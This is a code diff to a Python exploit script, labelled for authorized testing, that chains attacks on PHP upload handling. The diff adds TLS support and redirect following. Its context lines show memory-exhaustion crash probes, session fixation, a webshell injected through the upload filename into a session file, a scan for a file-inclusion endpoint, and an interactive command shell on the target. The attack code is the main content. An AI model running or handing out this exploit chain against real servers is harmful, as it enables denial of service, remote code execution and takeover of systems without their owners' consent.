@@ -13,6 +13,7 @@ For authorized security testing only.
 import os
 import re
 import socket
+import ssl
 import subprocess
 import sys
 import tempfile
@@ -45,9 +46,14 @@ VERSION_RE     = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)")
 W = 54
 
 
-def tcp(host, port, data: bytes, timeout: int = 10) -> bytes:
+def tcp(host, port, data: bytes, timeout: int = 10, use_tls: bool = False) -> bytes:
     try:
         s = socket.create_connection((host, port), timeout=timeout)
+        if use_tls:
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            s = ctx.wrap_socket(s, server_hostname=host)
         s.sendall(data)
         s.settimeout(max(10, timeout))
         buf = b""
@@ -62,7 +68,25 @@ def tcp(host, port, data: bytes, timeout: int = 10) -> bytes:
         return b""
 
 
-def post_upload(host, port, path, sid, filename):
+def follow_redirect(resp: bytes, cur_host: str, cur_port: int, cur_tls: bool):
+    """Extract Location from a 3xx response. Returns (host, port, prefix, tls)."""
+    loc = ""
+    for line in resp.split(b"\r\n"):
+        if line.lower().startswith(b"location:"):
+            loc = line.split(b":", 1)[1].strip().decode("latin-1", "replace")
+            break
+    if not loc:
+        return cur_host, cur_port, "", cur_tls
+    if loc.startswith("/"):
+        # Relative redirect — same host, path changed
+        return cur_host, cur_port, loc.rstrip("/"), cur_tls
+    u = urlparse(loc)
+    tls  = u.scheme == "https"
+    port = u.port or (443 if tls else 80)
+    return u.hostname or cur_host, port, u.path.rstrip("/"), tls
+
+
+def post_upload(host, port, path, sid, filename, tls=False):
     bd = "NexisChainA"
     body = (
         f"--{bd}\r\n"
@@ -81,10 +105,10 @@ def post_upload(host, port, path, sid, filename):
         f"Content-Length: {len(body)}\r\n"
         f"Connection: close\r\n\r\n"
     ).encode() + body
-    return tcp(host, port, req)
+    return tcp(host, port, req, use_tls=tls)
 
 
-def post_raw(host, port, path, boundary: str, body_bytes: bytes) -> bytes:
+def post_raw(host, port, path, boundary: str, body_bytes: bytes, tls=False) -> bytes:
     req = (
         f"POST {path} HTTP/1.1\r\n"
         f"Host: {host}\r\n"
@@ -92,16 +116,16 @@ def post_raw(host, port, path, boundary: str, body_bytes: bytes) -> bytes:
         f"Content-Length: {len(body_bytes)}\r\n"
         f"Connection: close\r\n\r\n"
     ).encode() + body_bytes
-    return tcp(host, port, req, timeout=45)
+    return tcp(host, port, req, timeout=45, use_tls=tls)
 
 
-def get(host, port, path):
+def get(host, port, path, tls=False):
     req = (
         f"GET {path} HTTP/1.1\r\n"
         f"Host: {host}\r\n"
         f"Connection: close\r\n\r\n"
     ).encode()
-    return tcp(host, port, req)
+    return tcp(host, port, req, use_tls=tls)
 
 
 def status_line(resp: bytes) -> str:
@@ -174,9 +198,9 @@ def build_probe_body(size_mib: int, parts: int) -> bytes:
     return raw[:-1]
 
 
-def run_crash_probes(host, port, path) -> tuple:
+def run_crash_probes(host, port, path, tls=False) -> tuple:
     ctrl_bytes = b"--x\nContent-Disposition:name=a;filename=\n\n"
-    ctrl_resp  = post_raw(host, port, path, "x", ctrl_bytes)
+    ctrl_resp  = post_raw(host, port, path, "x", ctrl_bytes, tls=tls)
     ctrl_st    = status_line(ctrl_resp)
     ctrl_body  = body(ctrl_resp)
 
@@ -188,7 +212,7 @@ def run_crash_probes(host, port, path) -> tuple:
 
     for i, (size_mib, parts) in enumerate(PROBES, 1):
         probe_bytes = build_probe_body(size_mib, parts)
-        probe_resp  = post_raw(host, port, path, "", probe_bytes)
+        probe_resp  = post_raw(host, port, path, "", probe_bytes, tls=tls)
         probe_st    = status_line(probe_resp)
         probe_body  = body(probe_resp)
 
@@ -208,11 +232,10 @@ def run_crash_probes(host, port, path) -> tuple:
     return None, None
 
 
-def discover_lfi(host, port, prefix, sid, upload_path=None):
+def discover_lfi(host, port, prefix, sid, upload_path=None, tls=False):
     """Probe common paths and parameters to find an LFI that can include the session file."""
     candidates = []
     if upload_path:
-        # Strip prefix to get bare endpoint; try upload path first
         ep = upload_path[len(prefix):] if prefix and upload_path.startswith(prefix) else upload_path
         if ep not in LFI_ENDPOINTS:
             candidates.append(ep)
@@ -224,7 +247,7 @@ def discover_lfi(host, port, prefix, sid, upload_path=None):
             fpath = prefix + ep
             for param in LFI_PARAMS:
                 path = f"{fpath}?{param}={sess}&c=id"
-                resp = get(host, port, path)
+                resp = get(host, port, path, tls=tls)
                 b = body(resp)
                 if WS_MARK in b:
                     return fpath, param, sess, extract_output(b)
@@ -364,6 +387,7 @@ def main():
     u      = urlparse(raw)
     host   = u.hostname
     port   = u.port or (443 if u.scheme == "https" else 80)
+    tls    = u.scheme == "https"
     prefix = u.path.rstrip("/")
     target = raw
 
@@ -375,12 +399,25 @@ def main():
 
     # ── Fingerprint ──────────────────────────────────────────────────
     info("Checking PHP version...")
-    resp     = get(host, port, "/")
+    resp    = get(host, port, "/", tls=tls)
+    st_root = status_line(resp)
+    info(f"GET /  →  {st_root}")
+
+    # Follow redirect up to 3 hops (e.g. HTTP→HTTPS, /→/app/)
+    hops = 0
+    while any(c in st_root for c in ("301", "302", "303", "307", "308")) and hops < 3:
+        new_host, new_port, new_prefix, new_tls = follow_redirect(resp, host, port, tls)
+        if (new_host, new_port, new_tls) == (host, port, tls) and new_prefix == prefix:
+            break
+        host, port, prefix, tls = new_host, new_port, new_prefix, new_tls
+        info(f"Following redirect → {'https' if tls else 'http'}://{host}:{port}{prefix or '/'}")
+        resp    = get(host, port, prefix or "/", tls=tls)
+        st_root = status_line(resp)
+        info(f"GET {prefix or '/'}  →  {st_root}")
+        hops   += 1
+
     php_ver  = hdr(resp, "X-Powered-By")
     server_h = hdr(resp, "Server") or "unknown"
-    st_root  = status_line(resp)
-
-    info(f"GET /  →  {st_root}")
     info(f"Server: {server_h}")
 
     # Also extract PHP version from Server header (e.g. Apache/x PHP/8.4.x)
@@ -413,7 +450,7 @@ def main():
     upload_path_fallback = None
     for path in UPLOAD_PATHS:
         fpath  = prefix + path
-        resp   = post_upload(host, port, fpath, SID + "probe", "probe.txt")
+        resp   = post_upload(host, port, fpath, SID + "probe", "probe.txt", tls=tls)
         st     = status_line(resp)
         cookie = hdr(resp, "set-cookie")
         info(f"  {fpath} → {st}")
@@ -438,7 +475,7 @@ def main():
 
     # ── Crash-probe detection ────────────────────────────────────────
     info("Running crash-probe detection (1 MB / 8 MB / 20 MB)...")
-    crash_verdict, crash_reason = run_crash_probes(host, port, upload_path)
+    crash_verdict, crash_reason = run_crash_probes(host, port, upload_path, tls=tls)
     if crash_verdict != "VULNERABLE":
         info("Running chunked OOM probe (streaming, bypasses post_max_size)...")
         crash_verdict, crash_reason = run_chunked_oom(host, port, upload_path)
@@ -451,7 +488,7 @@ def main():
     sep()
 
     # ── CVE-2026-109618: session fixation ────────────────────────────
-    resp   = post_upload(host, port, upload_path, SID, "probe.txt")
+    resp   = post_upload(host, port, upload_path, SID, "probe.txt", tls=tls)
     cookie = hdr(resp, "set-cookie")
     if SID in cookie:
         ok(f"CVE-2026-109618  CONFIRMED  — Set-Cookie echoed SID")
@@ -459,14 +496,14 @@ def main():
         info(f"CVE-2026-109618  SENT  — session file written internally")
 
     # ── CVE-2026-109619: filename injection ──────────────────────────
-    post_upload(host, port, upload_path, SID, WEBSHELL)
+    post_upload(host, port, upload_path, SID, WEBSHELL, tls=tls)
     info(f"CVE-2026-109619  SENT  — payload → /tmp/sess_{SID}")
     sep()
 
     # ── LFI discovery ────────────────────────────────────────────────
     info("Scanning for LFI inclusion point...")
     lfi_path, lfi_param, session_file, id_out = discover_lfi(
-        host, port, prefix, SID, upload_path
+        host, port, prefix, SID, upload_path, tls=tls
     )
 
     if not lfi_path:
@@ -515,7 +552,7 @@ def main():
         if not cmd:
             print("  shell> ", end="", flush=True)
             continue
-        resp = get(host, port, f"{lfi_path}?{lfi_param}={session_file}&c={quote(cmd)}")
+        resp = get(host, port, f"{lfi_path}?{lfi_param}={session_file}&c={quote(cmd)}", tls=tls)
         out  = extract_output(body(resp))
         for line in (out.splitlines() if out else ["(no output)"]):
             if line.strip():
